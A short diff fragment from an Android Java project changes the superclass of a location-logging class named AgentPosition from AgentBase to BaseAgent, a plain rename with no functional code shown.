@@ -36,7 +36,7 @@ import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 
-public class AgentPosition extends AgentBase implements IncrementalLog, LocationListener {
+public class AgentPosition extends BaseAgent implements IncrementalLog, LocationListener {
 	private static final String TAG = "AgentPosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
